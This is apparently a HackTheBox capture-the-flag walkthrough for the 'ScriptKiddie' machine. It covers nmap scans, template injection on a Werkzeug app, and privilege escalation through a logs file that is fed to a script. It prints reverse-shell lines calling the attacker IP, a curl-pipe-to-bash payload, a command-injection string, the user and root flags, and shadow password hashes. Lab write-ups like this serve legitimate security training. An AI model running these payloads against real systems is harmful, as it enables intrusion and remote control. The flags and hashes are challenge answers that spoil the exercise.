# Scriptkiddie Hackthebox Walkthrough

## All Ports Scan
```bash
# Nmap 7.91 scan initiated Sat Jun 12 17:02:23 2021 as: nmap -T4 -sT -p- -vv -oA nmap/allports 10.10.10.226
Warning: 10.10.10.226 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.226
Host is up, received echo-reply ttl 63 (0.16s latency).
Scanned at 2021-06-12 17:02:24 EDT for 898s
Not shown: 65524 closed ports
Reason: 65524 conn-refused
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack
5000/tcp  open     upnp    syn-ack
11071/tcp filtered unknown no-response
15611/tcp filtered unknown no-response
16273/tcp filtered unknown no-response
21419/tcp filtered unknown no-response
31277/tcp filtered unknown no-response
39625/tcp filtered unknown no-response
63573/tcp filtered unknown no-response
64344/tcp filtered unknown no-response
64627/tcp filtered unknown no-response

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jun 12 17:17:22 2021 -- 1 IP address (1 host up) scanned in 898.65 seconds
```

## Complete Scan
```bash
# Nmap 7.91 scan initiated Sat Jun 12 17:17:29 2021 as: nmap -T4 -sV -sC -sT -A -vv -p22,5000 -oA nmap/complete 10.10.10.226
Nmap scan report for 10.10.10.226
Host is up, received echo-reply ttl 63 (0.24s latency).
Scanned at 2021-06-12 17:17:29 EDT for 22s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/YB1g/YHwZNvTzj8lysM+SzX6dZzRbfF24y3ywkhai4pViGEwUklIPkEvuLSGH97NJ4y8r9uUXzyoq3iuVJ/vGXiFlPCrg+QDp7UnwANBmDqbVLucKdor+JkWHJJ1h3ftpEHgol54tj+6J7ftmaOR29Iwg+FKtcyNG6PY434cfA0Pwshw6kKgFa+HWljNl+41H3WVua4QItPmrh+CrSoaA5kCe0FAP3c2uHcv2JyDjgCQxmN1GoLtlAsEznHlHI1wycNZGcHDnqxEmovPTN4qisOKEbYfy2mu1Eqq3Phv8UfybV8c60wUqGtClj3YOO1apDZKEe8eZZqy5eXU8mIO+uXcp5zxJ/Wrgng7WTguXGzQJiBHSFq52fHFvIYSuJOYEusLWkGhiyvITYLWZgnNL+qAVxZtP80ZTq+lm4cJHJZKl0OYsmqO0LjlMOMTPFyA+W2IOgAmnM+miSmSZ6n6pnSA+LE2Pj01egIhHw5+duAYxUHYOnKLVak1WWk/C68=
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJA31QhiIbYQMUwn/n3+qcrLiiJpYIia8HdgtwkI8JkCDm2n+j6dB3u5I17IOPXE7n5iPiW9tPF3Nb0aXmVJmlo=
|   256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOWjCdxetuUPIPnEGrowvR7qRAR7nuhUbfFraZFmbIr4
5000/tcp open  http    syn-ack Werkzeug httpd 0.16.1 (Python 3.8.5)
| http-methods: 
|_  Supported Methods: OPTIONS POST GET HEAD
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=6/12%OT=22%CT=%CU=42304%PV=Y%DS=2%DC=T%G=N%TM=60C5247F%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 26.109 days (since Mon May 17 14:40:24 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   289.32 ms 10.10.14.1
2   289.46 ms 10.10.10.226

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 12 17:17:51 2021 -- 1 IP address (1 host up) scanned in 22.49 seconds
```

## Enumerating Port 5000

![](Images/Pasted%20image%2020210612171913.png)

After searching for exploit got it is vulnerable to template injection

![](Images/Pasted%20image%2020210612172040.png)

```python
Attacker Pc : 
# vim shell.sh
bash -i >& /dev/tcp/10.10.14.48/443 0>&1

Change Payload Value to.
# Change me
payload = 'curl http://10.10.14.48/shell.sh | bash'
```

And here we got a shell of kid.

![](Images/Pasted%20image%2020210612175117.png)

## Privelege Escalation 

While looking for privesec we got a file called scanloosers, and according to that file it calling hackers from the home/kid/logs

![](Images/Pasted%20image%2020210612175458.png)

So here we got a shell of pwn

```bash
kid@scriptkiddie:~/logs$ echo "aa bb ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.48/1111 0>&1 #'" >> hackers
```

![](Images/Pasted%20image%2020210612181508.png)

And here we have a permission to run metasploit as a super user.

![](Images/Pasted%20image%2020210612181614.png)

```bash 
Flags : 
User : 69734d32a6f174b322be905f8fcb4960
Root Flag : f3e64a7e8baef09045d2f3e0c4e79e78

Hash : 
root:$6$RO4wVQ/hyXhjln4S$UQl5o6XSa2USqAM.RT9YwujFhZWriZqEz5We.opH1FLTbDtLfruET9jlKcEEqfxnCb1UxwhcfWJ/2gPJE77Bl.:18632:0:99999:7:::
kid:$6$t9JpsHjs2xHQDAP1$QEU0fwmSLk43RRFkBN8qeBekqyjoGgSTny9srHGD38bTTfbeVSQb6lLMD3T.xWPubJVW9TMxsH3wWUrfNXHj.1:18632:0:99999:7:::
pwn:$6$Ci5SpF8qatWsgxYl$V.25LKjBgcpiLtytRV1OaqEBtYWMRT3HURaNXQ0mrdwMz12S0BZccmVgNDeAZcShpponbEedzJlpcGOXpLcWx.:18655:0:99999:7:::
```
